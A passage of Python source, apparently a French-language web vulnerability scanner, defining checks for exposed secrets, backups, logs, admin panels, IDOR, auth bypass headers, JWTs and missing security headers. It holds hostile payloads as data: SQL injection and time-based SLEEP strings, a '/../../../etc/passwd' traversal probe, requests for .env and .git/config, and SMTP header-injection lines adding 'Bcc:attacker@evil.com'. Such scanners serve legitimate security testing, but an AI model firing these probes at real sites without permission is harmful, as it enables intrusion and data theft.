                full_url = src if src.startswith("http") else url.rstrip("/") + "/" + src.lstrip("/")
                
                try:
                    js_code = requests.get(full_url, timeout=10, verify=False).text
                    
                    for pattern, secret_type in secret_patterns:
                        matches = re.findall(pattern, js_code, re.IGNORECASE)
                        if matches:
                            msg = f"[VULNÉRABLE] {secret_type} potentiel trouvé dans: {full_url}"
                            print(f"{Colors.RED}{msg}{Colors.RESET}")
                            results.append(msg)
                except:
                    continue
            
            if not results:
                print(f"{Colors.GREEN}[+] Pas de secrets évidents détectés{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur: {str(e)}{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucun secret détecté"

    def scan_cms_version(url):
        print(f"\n{Colors.CYAN}[*] Scan Versions CMS{Colors.RESET}")
        results = []
        
        cms_patterns = [
            (r"wp-content", "WordPress"),
            (r"joomla", "Joomla"),
            (r"drupal", "Drupal"),
            (r"magento", "Magento"),
            (r"prestashop", "PrestaShop")
        ]
        
        version_patterns = [
            r"version\s*[:=]\s*[\"']?([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
            r"v([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
            r"([0-9]+\.[0-9]+(?:\.[0-9]+)?)"
        ]
        
        try:
            r = requests.get(url, timeout=10, verify=False)
            
            detected_cms = None
            for pattern, cms_name in cms_patterns:
                if re.search(pattern, r.text, re.IGNORECASE):
                    detected_cms = cms_name
                    print(f"{Colors.CYAN}[+] CMS détecté: {cms_name}{Colors.RESET}")
                    break
            
            if detected_cms:
                for version_pattern in version_patterns:
                    matches = re.findall(version_pattern, r.text)
                    if matches:
                        for version in matches[:3]:
                            msg = f"[INFO] Version possible: {detected_cms} {version}"
                            print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                            results.append(msg)
                        break
            
            if not results:
                print(f"{Colors.GREEN}[+] Aucune version CMS spécifique détectée{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur: {str(e)}{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucune version CMS détectée"

    def scan_api_endpoints(url):
        print(f"\n{Colors.CYAN}[*] Scan Endpoints API{Colors.RESET}")
        results = []
        
        api_paths = [
            "/api/", "/api/v1/", "/api/v2/",
            "/api/users", "/api/user", "/api/admin",
            "/api/data", "/api/config", "/api/settings",
            "/api/docs", "/api/swagger", "/api/graphql",
            "/rest/", "/rest/v1/", "/rest/api/",
            "/v1/", "/v2/", "/v3/"
        ]
        
        sensitive_keywords = [
            "email", "password", "token", "secret", "key",
            "credential", "admin", "user", "private"
        ]
        
        for path in api_paths:
            full_url = url.rstrip("/") + path
            try:
                r = requests.get(full_url, timeout=10, verify=False)
                
                if r.status_code == 200:
                
                    try:
                        json_data = r.json()
                    
                        json_str = json.dumps(json_data).lower()
                        for keyword in sensitive_keywords:
                            if keyword in json_str:
                                msg = f"[VULNÉRABLE] API exposée avec données sensibles: {full_url}"
                                print(f"{Colors.RED}{msg}{Colors.RESET}")
                                results.append(msg)
                                break
                    except:
                        if any(keyword in r.text.lower() for keyword in sensitive_keywords):
                            msg = f"[ALERTE] Endpoint API accessible: {full_url}"
                            print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                            results.append(msg)
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas d'API exposée dangereusement détectée{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucun endpoint API vulnérable"

    def scan_database_dumps(url):
        print(f"\n{Colors.CYAN}[*] Scan Dumps Base de Données{Colors.RESET}")
        results = []
        
        dump_files = [
            "/dump.sql", "/backup.sql", "/db.sql", "/database.sql",
            "/backup.zip", "/backup.tar.gz", "/db_backup.sql",
            "/mysqldump.sql", "/postgres.sql", "/data.sql",
            "/export.sql", "/site.sql", "/www.sql"
        ]
        
        for dump_file in dump_files:
            full_url = url.rstrip("/") + dump_file
            try:
                r = requests.head(full_url, timeout=10, verify=False)
                
                if r.status_code == 200:
                    content_length = int(r.headers.get('Content-Length', 0))
                    if content_length > 1000:
                        msg = f"[VULNÉRABLE] Dump DB accessible: {full_url} ({content_length} bytes)"
                        print(f"{Colors.RED}{msg}{Colors.RESET}")
                        results.append(msg)
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de dump de base de données exposé{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucun dump détecté"

    def scan_backup_files(url):
        print(f"\n{Colors.CYAN}[*] Scan Fichiers Backup{Colors.RESET}")
        results = []
        
        extensions = [".zip", ".tar.gz", ".tar", ".rar", ".bak", ".old", ".backup", ".7z"]
        names = ["backup", "site", "website", "www", "public_html", "htdocs", "archive", "old"]
        
        for name in names:
            for ext in extensions:
                test_file = f"/{name}{ext}"
                full_url = url.rstrip("/") + test_file
                
                try:
                    r = requests.head(full_url, timeout=5, verify=False)
                    
                    if r.status_code == 200:
                        content_length = int(r.headers.get('Content-Length', 0))
                        if content_length > 1000:
                            msg = f"[VULNÉRABLE] Backup accessible: {full_url} ({content_length} bytes)"
                            print(f"{Colors.RED}{msg}{Colors.RESET}")
                            results.append(msg)
                except:
                    continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de fichiers backup exposés{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucun backup détecté"

    def scan_log_files(url):
        print(f"\n{Colors.CYAN}[*] Scan Fichiers Logs{Colors.RESET}")
        results = []
        
        log_paths = [
            "/logs/error.log", "/logs/access.log", "/logs/debug.log",
            "/error.log", "/access.log", "/debug.log",
            "/server.log", "/app.log", "/application.log",
            "/var/log/apache2/error.log", "/var/log/nginx/error.log"
        ]
        
        sensitive_patterns = [
            "exception", "error", "warning", "fatal",
            "password", "token", "key", "secret"
        ]
        
        for log_path in log_paths:
            full_url = url.rstrip("/") + log_path
            try:
                r = requests.get(full_url, timeout=10, verify=False)
                
                if r.status_code == 200 and len(r.text) > 100:
                    
                    text_lower = r.text.lower()
                    for pattern in sensitive_patterns:
                        if pattern in text_lower:
                            msg = f"[VULNÉRABLE] Log accessible avec infos sensibles: {full_url}"
                            print(f"{Colors.RED}{msg}{Colors.RESET}")
                            results.append(msg)
                            break
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de logs sensibles exposés{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucun log exposé"


    def scan_idor(url):
        print(f"\n{Colors.CYAN}[*] Scan IDOR{Colors.RESET}")
        results = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            msg = "[INFO] Aucun paramètre dans l'URL pour tester IDOR"
            print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
            return msg
        
        for param, values in params.items():
            try:
                original_value = values[0]
                if original_value.isdigit():
                    test_values = [
                        str(int(original_value) - 1),
                        str(int(original_value) + 1),
                        "1", "2", "999", "9999"
                    ]
                    
                    original_response = requests.get(url, timeout=10, verify=False)
                    original_length = len(original_response.text)
                    
                    for test_val in test_values:
                        new_params = params.copy()
                        new_params[param] = [test_val]
                        new_query = urlencode(new_params, doseq=True)
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                            parsed.params, new_query, parsed.fragment))
                        
                        try:
                            test_response = requests.get(test_url, timeout=10, verify=False)
                            if test_response.status_code == 200:
                                if abs(len(test_response.text) - original_length) > 100:
                                    msg = f"[POTENTIEL IDOR] Accès à d'autres ressources possible: {param}={test_val}"
                                    print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                                    results.append(msg)
                        except:
                            continue
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas d'IDOR évident détecté{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucun IDOR détecté"

    def scan_auth_bypass(url):
        print(f"\n{Colors.CYAN}[*] Scan Auth Bypass{Colors.RESET}")
        results = []
        
        bypass_params = [
            "?admin=true", "?isAdmin=1", "?role=admin",
            "?access_level=admin", "?debug=true", "?auth=bypass"
        ]
        
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"}
        ]
        
        for param in bypass_params:
            test_url = url.rstrip("?") + param
            try:
                r = requests.get(test_url, timeout=10, verify=False)
                if r.status_code == 200 and ("admin" in r.text.lower() or "dashboard" in r.text.lower()):
                    msg = f"[VULNÉRABLE] Bypass possible avec: {param}"
                    print(f"{Colors.RED}{msg}{Colors.RESET}")
                    results.append(msg)
            except:
                continue
        
        for headers in bypass_headers:
            try:
                r = requests.get(url, headers=headers, timeout=10, verify=False)
                if r.status_code == 200 and ("admin" in r.text.lower() or "dashboard" in r.text.lower()):
                    msg = f"[VULNÉRABLE] Bypass possible avec header: {list(headers.keys())[0]}"
                    print(f"{Colors.RED}{msg}{Colors.RESET}")
                    results.append(msg)
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de bypass d'authentification détecté{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucun bypass détecté"

    def scan_admin_endpoints(url):
        print(f"\n{Colors.CYAN}[*] Scan Endpoints Admin{Colors.RESET}")
        results = []
        
        admin_paths = [
            "/admin", "/admin/", "/administrator", "/admin/login",
            "/admin/dashboard", "/admin/config", "/admin/panel",
            "/wp-admin", "/wp-login.php", "/phpmyadmin",
            "/manager", "/management", "/control-panel",
            "/cpanel", "/webadmin", "/admincp"
        ]
        
        for path in admin_paths:
            full_url = url.rstrip("/") + path
            try:
                r = requests.get(full_url, timeout=10, verify=False, allow_redirects=False)
                
                if r.status_code in [200, 301, 302]:
                    if r.status_code == 200:
                        msg = f"[EXPOSÉ] Endpoint admin accessible: {full_url}"
                        print(f"{Colors.RED}{msg}{Colors.RESET}")
                    else:
                        msg = f"[INFO] Endpoint admin trouvé (redirection): {full_url}"
                        print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                    results.append(msg)
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas d'endpoint admin exposé{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucun endpoint admin exposé"

    def scan_jwt_issues(url):
        print(f"\n{Colors.CYAN}[*] Scan JWT Issues{Colors.RESET}")
        results = []
        
        try:
            r = requests.get(url, timeout=10, verify=False)
            

            for cookie_name, cookie_value in r.cookies.items():
                if '.' in cookie_value and cookie_value.count('.') == 2:
                    msg = f"[INFO] JWT potentiel détecté dans cookie: {cookie_name}"
                    print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                    results.append(msg)
                    

                    try:
                        parts = cookie_value.split('.')
                        payload = parts[1]
                        padding = 4 - len(payload) % 4
                        if padding != 4:
                            payload += '=' * padding
                        
                        import base64
                        decoded = base64.urlsafe_b64decode(payload).decode('utf-8')
                        payload_data = json.loads(decoded)
                        
                        msg = f"[INFO] Contenu JWT décodé: {json.dumps(payload_data, indent=2)}"
                        print(f"{Colors.CYAN}{msg}{Colors.RESET}")
                        results.append(msg)
                        
                        if 'role' in str(payload_data).lower():
                            msg = "[ALERTE] Le JWT contient un champ 'role' - vérifier s'il peut être modifié"
                            print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                            results.append(msg)
                            
                    except Exception as e:
                        msg = f"[INFO] Impossible de décoder le JWT: {str(e)}"
                        print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
            
            auth_header = r.request.headers.get('Authorization', '')
            if 'bearer' in auth_header.lower() and '.' in auth_header:
                msg = "[INFO] JWT détecté dans header Authorization"
                print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                results.append(msg)
                
        except Exception as e:
            msg = f"[!] Erreur lors de l'analyse JWT: {str(e)}"
            print(f"{Colors.RED}{msg}{Colors.RESET}")
            return msg
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de JWT détecté ou problème évident{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucun problème JWT détecté"

    def scan_jquery_version(url):
        print(f"\n{Colors.CYAN}[*] Scan Version jQuery{Colors.RESET}")
        results = []
        
        try:
            r = requests.get(url, timeout=10, verify=False)
            
            jquery_patterns = [
                r'jquery[/-]?(\d+\.\d+\.\d+)',
                r'jquery\.min\.js[?v=]*(\d+\.\d+\.\d+)',
                r'jQuery\s+v(\d+\.\d+\.\d+)'
            ]
            
            for pattern in jquery_patterns:
                matches = re.findall(pattern, r.text, re.IGNORECASE)
                for version in matches:
                    major, minor, patch = map(int, version.split('.'))
                    
                    if major < 3 or (major == 3 and minor < 5):
                        msg = f"[VULNÉRABLE] jQuery {version} détecté (vulnérable XSS)"
                        print(f"{Colors.RED}{msg}{Colors.RESET}")
                        results.append(msg)
                    else:
                        msg = f"[INFO] jQuery {version} détecté (version récente)"
                        print(f"{Colors.GREEN}{msg}{Colors.RESET}")
                        results.append(msg)
                    break
            
            if not results:
                print(f"{Colors.YELLOW}[+] jQuery non détecté ou version non identifiable{Colors.RESET}")
                
        except Exception as e:
            msg = f"[!] Erreur: {str(e)}"
            print(f"{Colors.RED}{msg}{Colors.RESET}")
            return msg
        
        return "\n".join(results) if results else "jQuery non détecté"

    def scan_client_side_controls(url):
        print(f"\n{Colors.CYAN}[*] Scan Contrôles Côté Client{Colors.RESET}")
        results = []
        
        client_patterns = [
            (r'if\s*\(\s*isAdmin', "Vérification isAdmin en JavaScript"),
            (r'if\s*\(\s*user\.role', "Vérification role en JavaScript"),
            (r'if\s*\(\s*admin\s*==', "Vérification admin en JavaScript"),
            (r'disabled\s*=\s*["\']false["\']', "Contrôle disabled en HTML"),
            (r'hidden\s*=\s*["\']false["\']', "Contrôle hidden en HTML"),
            (r'function\s+checkAdmin', "Fonction checkAdmin"),
            (r'function\s+validateRole', "Fonction validateRole")
        ]
        
        try:
            r = requests.get(url, timeout=10, verify=False)
            
            for pattern, description in client_patterns:
                if re.search(pattern, r.text, re.IGNORECASE):
                    msg = f"[ALERTE] Contrôle côté client détecté: {description}"
                    print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                    results.append(msg)
            
            if not results:
                print(f"{Colors.GREEN}[+] Pas de contrôle côté client évident détecté{Colors.RESET}")
                
        except Exception as e:
            msg = f"[!] Erreur: {str(e)}"
            print(f"{Colors.RED}{msg}{Colors.RESET}")
            return msg
        
        return "\n".join(results) if results else "Aucun contrôle côté client détecté"

    def scan_hidden_parameters(url):
        print(f"\n{Colors.CYAN}[*] Scan Paramètres Cachés{Colors.RESET}")
        results = []
        
        hidden_params = [
            "debug", "test", "admin", "isAdmin", "role",
            "access", "auth", "token", "key", "dev"
        ]
        
        for param in hidden_params:
            for value in ["1", "true", "yes", "admin"]:
                test_url = f"{url.rstrip('?')}?{param}={value}"
                try:
                    r = requests.get(test_url, timeout=10, verify=False)
                    
                    if r.status_code == 200:
                        indicators = ["debug", "admin", "dashboard", "config", "settings"]
                        if any(ind in r.text.lower() for ind in indicators):
                            msg = f"[VULNÉRABLE] Paramètre caché actif: {param}={value}"
                            print(f"{Colors.RED}{msg}{Colors.RESET}")
                            results.append(msg)
                            break
                except:
                    continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de paramètre caché exploitable{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucun paramètre caché détecté"

    def scan_smtp_injection(url):
        print(f"\n{Colors.CYAN}[*] Scan SMTP Injection{Colors.RESET}")
        results = []
        
        smtp_payloads = [
            "%0d%0aBcc:attacker@evil.com",
            "\r\nBcc:attacker@evil.com",
            "\nCc:attacker@evil.com"
        ]
        
        try:
            r = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            forms = soup.find_all("form")
            
            for form in forms:
                email_inputs = form.find_all("input", {"type": "email"})
                text_inputs = form.find_all("input", {"type": "text"})
                
                for input_field in email_inputs + text_inputs:
                    field_name = input_field.get("name")
                    if field_name:
                        msg = f"[INFO] Champ potentiellement testable: {field_name}"
                        print(f"{Colors.CYAN}{msg}{Colors.RESET}")
                        results.append(msg)
            
            if forms:
                msg = f"[INFO] {len(forms)} formulaire(s) trouvé(s) - test manuel recommandé avec payloads SMTP"
                print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                results.append(msg)
            else:
                msg = "[INFO] Aucun formulaire détecté"
                print(f"{Colors.GREEN}{msg}{Colors.RESET}")
                
        except Exception as e:
            msg = f"[!] Erreur: {str(e)}"
            print(f"{Colors.RED}{msg}{Colors.RESET}")
            return msg
        
        return "\n".join(results) if results else "Aucun formulaire détecté"

    def scan_direct_object_access(url):
        print(f"\n{Colors.CYAN}[*] Scan Direct Object Access{Colors.RESET}")
        results = []
        
        id_patterns = [
            r'/user/(\d+)',
            r'/profile/(\d+)',
            r'/document/(\d+)',
            r'/file/(\d+)',
            r'/item/(\d+)',
            r'\?id=(\d+)',
            r'\?user_id=(\d+)'
        ]
        
        parsed = urlparse(url)
        
        for pattern in id_patterns:
            match = re.search(pattern, url)
            if match:
                original_id = match.group(1)
                msg = f"[INFO] ID numérique détecté: {original_id}"
                print(f"{Colors.CYAN}{msg}{Colors.RESET}")
                results.append(msg)
                
                test_ids = ["1", "2", str(int(original_id) + 1), "999"]
                for test_id in test_ids:
                    if test_id != original_id:
                        test_url = re.sub(pattern, f'/user/{test_id}' if '/user/' in pattern else f'?id={test_id}', url)
                        try:
                            r = requests.get(test_url, timeout=10, verify=False)
                            if r.status_code == 200:
                                msg = f"[POTENTIEL IDOR] Accès possible avec ID: {test_id}"
                                print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                                results.append(msg)
                        except:
                            continue
                break
        
        if not results:
            msg = "[INFO] Aucun pattern d'ID détecté dans l'URL"
            print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
            return msg
        
        return "\n".join(results)

    def scan_unauthorized_access(url):
        print(f"\n{Colors.CYAN}[*] Scan Unauthorized Access{Colors.RESET}")
        results = []
        
        invalid_tokens = [
            "Bearer invalid_token_12345",
            "Bearer ",
            "Token invalid",
            ""
        ]
        
        for token in invalid_tokens:
            headers = {"Authorization": token} if token else {}
            try:
                r = requests.get(url, headers=headers, timeout=10, verify=False)
                
                if r.status_code == 200:
                    msg = f"[VULNÉRABLE] Accès autorisé avec token invalide: '{token[:20]}...'"
                    print(f"{Colors.RED}{msg}{Colors.RESET}")
                    results.append(msg)
                elif r.status_code == 401:
                    msg = f"[OK] Accès refusé correctement pour: '{token[:20]}...'"
                    print(f"{Colors.GREEN}{msg}{Colors.RESET}")
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Autorisation correctement vérifiée{Colors.RESET}")
        
        return "\n".join(results) if results else "Autorisation correcte"


    def scan_directory_listing(url):
        print(f"\n{Colors.CYAN}[*] Scan Directory Listing{Colors.RESET}")
        results = []
        
        test_dirs = [
            "/", "/uploads/", "/images/", "/files/", "/documents/",
            "/backup/", "/temp/", "/tmp/", "/static/", "/assets/",
            "/public/", "/media/", "/download/", "/data/"
        ]
        
        listing_indicators = [
            "Index of", "Directory listing", "Parent Directory",
            "<title>Index of", "[DIR]", "[TXT]"
        ]
        
        for test_dir in test_dirs:
            full_url = url.rstrip("/") + test_dir
            try:
                r = requests.get(full_url, timeout=10, verify=False)
                
                if r.status_code == 200:
                    for indicator in listing_indicators:
                        if indicator in r.text:
                            msg = f"[VULNÉRABLE] Listing activé: {full_url}"
                            print(f"{Colors.RED}{msg}{Colors.RESET}")
                            results.append(msg)
                            break
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de listing de répertoire détecté{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucun listing détecté"

    def scan_sensitive_files(url):
        print(f"\n{Colors.CYAN}[*] Scan Fichiers Sensibles{Colors.RESET}")
        results = []
        
        sensitive_files = [
            "/.git/config", "/.git/HEAD", "/.gitignore",
            "/.env", "/.env.local", "/.env.production",
            "/config.php", "/configuration.php", "/wp-config.php",
            "/.htaccess", "/.htpasswd", "/web.config",
            "/composer.json", "/package.json", "/yarn.lock",
            "/phpinfo.php", "/info.php", "/test.php",
            "/.DS_Store", "/Thumbs.db"
        ]
        
        for file_path in sensitive_files:
            full_url = url.rstrip("/") + file_path
            try:
                r = requests.get(full_url, timeout=10, verify=False)
                
                if r.status_code == 200 and len(r.text) > 10:
                    msg = f"[VULNÉRABLE] Fichier sensible exposé: {full_url}"
                    print(f"{Colors.RED}{msg}{Colors.RESET}")
                    results.append(msg)
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de fichiers sensibles exposés{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucun fichier sensible détecté"

    def scan_security_headers(url):
        print(f"\n{Colors.CYAN}[*] Scan Security Headers{Colors.RESET}")
        results = []
        
        required_headers = {
            "Strict-Transport-Security": "Force HTTPS",
            "X-Frame-Options": "Protection Clickjacking",
            "X-Content-Type-Options": "Protection MIME sniffing",
            "Content-Security-Policy": "Protection XSS/injection",
            "X-XSS-Protection": "Protection XSS navigateur",
            "Referrer-Policy": "Contrôle referrer"
        }
        
        try:
            r = requests.get(url, timeout=10, verify=False)
            
            missing = []
            present = []
            
            for header, description in required_headers.items():
                if header in r.headers:
                    msg = f"[OK] {header}: {r.headers[header][:50]}"
                    print(f"{Colors.GREEN}{msg}{Colors.RESET}")
                    present.append(msg)
                else:
                    msg = f"[MANQUANT] {header} - {description}"
                    print(f"{Colors.RED}{msg}{Colors.RESET}")
                    missing.append(msg)
                    results.append(msg)
            
            if not missing:
                msg = "[EXCELLENT] Tous les en-têtes de sécurité sont présents"
                print(f"{Colors.GREEN}{msg}{Colors.RESET}")
                
        except Exception as e:
            msg = f"[!] Erreur: {str(e)}"
            print(f"{Colors.RED}{msg}{Colors.RESET}")
            return msg
        
        return "\n".join(results) if results else "Tous les en-têtes présents"

    def scan_captcha_absence(url):
        print(f"\n{Colors.CYAN}[*] Scan Absence de CAPTCHA{Colors.RESET}")
        results = []
        
        try:
            r = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            
            forms = soup.find_all("form")
            
            captcha_indicators = [
                "recaptcha", "g-recaptcha", "captcha", "hcaptcha",
                "turnstile", "friendly-captcha"
            ]
            
            for i, form in enumerate(forms):
                form_str = str(form).lower()
                has_captcha = any(indicator in form_str for indicator in captcha_indicators)
                
                form_type = "inconnu"
                if any(word in form_str for word in ["login", "signin", "connexion"]):
                    form_type = "login"
                elif any(word in form_str for word in ["register", "signup", "inscription"]):
                    form_type = "inscription"
                elif any(word in form_str for word in ["contact", "message", "email"]):
                    form_type = "contact"
                
                if not has_captcha and form_type != "inconnu":
                    msg = f"[ALERTE] Formulaire {form_type} sans CAPTCHA (formulaire #{i+1})"
                    print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                    results.append(msg)
                elif has_captcha:
                    msg = f"[OK] CAPTCHA détecté sur formulaire {form_type}"
                    print(f"{Colors.GREEN}{msg}{Colors.RESET}")
            
            if not forms:
                msg = "[INFO] Aucun formulaire détecté"
                print(f"{Colors.CYAN}{msg}{Colors.RESET}")
                return msg
                
        except Exception as e:
            msg = f"[!] Erreur: {str(e)}"
            print(f"{Colors.RED}{msg}{Colors.RESET}")
            return msg
        
        return "\n".join(results) if results else "CAPTCHA présent sur tous les formulaires critiques"

    def scan_debug_headers(url):
        print(f"\n{Colors.CYAN}[*] Scan Debug Headers{Colors.RESET}")
        results = []
        
        debug_headers = [
            "X-Powered-By", "Server", "X-AspNet-Version",
            "X-AspNetMvc-Version", "X-Debug-Token", "X-Debug-Token-Link",
            "X-Drupal-Cache", "X-Generator", "X-Drupal-Dynamic-Cache"
        ]
        
        try:
            r = requests.get(url, timeout=10, verify=False)
            
            for header in debug_headers:
                if header in r.headers:
                    msg = f"[INFO] En-tête debug: {header} = {r.headers[header]}"
                    print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                    results.append(msg)
            
            if not results:
                print(f"{Colors.GREEN}[+] Pas d'en-tête debug détecté{Colors.RESET}")
                
        except Exception as e:
            msg = f"[!] Erreur: {str(e)}"
            print(f"{Colors.RED}{msg}{Colors.RESET}")
            return msg
        
        return "\n".join(results) if results else "Aucun en-tête debug"

    def scan_dev_directories(url):
        print(f"\n{Colors.CYAN}[*] Scan Répertoires Dev{Colors.RESET}")
        results = []
        
        dev_dirs = [
            "/dev/", "/development/", "/test/", "/tests/",
            "/staging/", "/debug/", "/.dev/", "/_dev/",
            "/tmp/", "/temp/", "/demo/", "/sandbox/"
        ]
        
        for dev_dir in dev_dirs:
            full_url = url.rstrip("/") + dev_dir
            try:
                r = requests.get(full_url, timeout=10, verify=False)
                
                if r.status_code == 200 and len(r.text) > 100:
                    msg = f"[VULNÉRABLE] Répertoire dev accessible: {full_url}"
                    print(f"{Colors.RED}{msg}{Colors.RESET}")
                    results.append(msg)
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de répertoire dev exposé{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucun répertoire dev détecté"

    def scan_http_methods(url):
        print(f"\n{Colors.CYAN}[*] Scan Méthodes HTTP{Colors.RESET}")
        results = []
        
        try:
            r = requests.options(url, timeout=10, verify=False)
            
            allowed = r.headers.get("Allow", "")
            if allowed:
                msg = f"[INFO] Méthodes autorisées: {allowed}"
                print(f"{Colors.CYAN}{msg}{Colors.RESET}")
                results.append(msg)
                
                dangerous_methods = ["PUT", "DELETE", "TRACE", "CONNECT"]
                for method in dangerous_methods:
                    if method in allowed.upper():
                        msg = f"[ALERTE] Méthode dangereuse autorisée: {method}"
                        print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                        results.append(msg)
            else:
                msg = "[INFO] En-tête Allow non présent"
                print(f"{Colors.CYAN}{msg}{Colors.RESET}")
                return msg
                
        except Exception as e:
            msg = f"[!] Erreur: {str(e)}"
            print(f"{Colors.RED}{msg}{Colors.RESET}")
            return msg
        
        return "\n".join(results) if results else "Méthodes HTTP standard uniquement"

    def scan_missing_authentication(url):
        print(f"\n{Colors.CYAN}[*] Scan Absence Authentification{Colors.RESET}")
        results = []
        
        protected_paths = [
            "/admin", "/dashboard", "/panel", "/console",
            "/api/admin", "/api/users", "/api/config"
        ]
        
        for path in protected_paths:
            full_url = url.rstrip("/") + path
            try:
                r = requests.get(full_url, timeout=10, verify=False)
                
                if r.status_code == 200 and "login" not in r.text.lower():
                    msg = f"[VULNÉRABLE] Accès sans authentification: {full_url}"
                    print(f"{Colors.RED}{msg}{Colors.RESET}")
                    results.append(msg)
                elif r.status_code == 401 or r.status_code == 403:
                    msg = f"[OK] Protection activée: {full_url} (HTTP {r.status_code})"
                    print(f"{Colors.GREEN}{msg}{Colors.RESET}")
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Authentification correctement requise{Colors.RESET}")
        
        return "\n".join(results) if results else "Authentification correcte"

    def scan_error_handling(url):
        print(f"\n{Colors.CYAN}[*] Scan Gestion Erreurs{Colors.RESET}")
        results = []
        
        error_tests = [
            "/nonexistent_page_12345",
            "/../../../etc/passwd",
            "/?error=test",
            "/index.php?id=9999999"
        ]
        
        error_patterns = [
            "exception", "traceback", "stack trace", "error on line",
            "fatal error", "warning:", "notice:", "undefined",
            "mysql", "postgresql", "sqlite", "database error"
        ]
        
        for test_path in error_tests:
            test_url = url.rstrip("/") + test_path
            try:
                r = requests.get(test_url, timeout=10, verify=False)
                
                text_lower = r.text.lower()
                for pattern in error_patterns:
                    if pattern in text_lower:
                        msg = f"[VULNÉRABLE] Erreur détaillée exposée sur: {test_path}"
                        print(f"{Colors.RED}{msg}{Colors.RESET}")
                        results.append(msg)
                        break
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Gestion des erreurs appropriée{Colors.RESET}")
        
        return "\n".join(results) if results else "Gestion des erreurs correcte"


    def scan_sql_injection_error_based(url):
        print(f"\n{Colors.CYAN}[*] Scan SQL Injection (Error-Based){Colors.RESET}")
        results = []
        
        sql_payloads = [
            "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
            "' OR 1=1--", "\" OR 1=1--", "') OR ('1'='1",
            "1' AND '1'='1", "1\" AND \"1\"=\"1"
        ]
        
        sql_error_patterns = [
            r"sql syntax", r"mysql", r"mysqli", r"postgresql",
            r"ora-\d{5}", r"sqlstate", r"syntax error",
            r"unterminated quoted string", r"pg_query",
            r"sqlite", r"microsoft sql server"
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            msg = "[INFO] Aucun paramètre GET à tester"
            print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
            return msg
        
        for param in params:
            print(f"\n{Colors.CYAN}Test du paramètre: {param}{Colors.RESET}")
            
            for payload in sql_payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                    parsed.params, test_query, parsed.fragment))
                
                try:
                    r = requests.get(test_url, timeout=10, verify=False)
                    
                    for pattern in sql_error_patterns:
                        if re.search(pattern, r.text, re.IGNORECASE):
                            msg = f"[VULNÉRABLE] SQLi détectée sur {param} avec payload: {payload}"
                            print(f"{Colors.RED}{msg}{Colors.RESET}")
                            results.append(msg)
                            break
                    
                    if results:
                        break
                except:
                    continue
            
            if results:
                break
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de SQL Injection évidente détectée{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucune SQLi détectée"

    def scan_sql_injection_blind(url):
        print(f"\n{Colors.CYAN}[*] Scan SQL Injection (Blind Time-Based){Colors.RESET}")
        results = []
        
        time_payloads = [
            ("' OR SLEEP(5)--", 5),
            ("' AND SLEEP(5)--", 5),
            ("'; WAITFOR DELAY '0:0:5'--", 5),
            ("'; SELECT pg_sleep(5)--", 5)
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
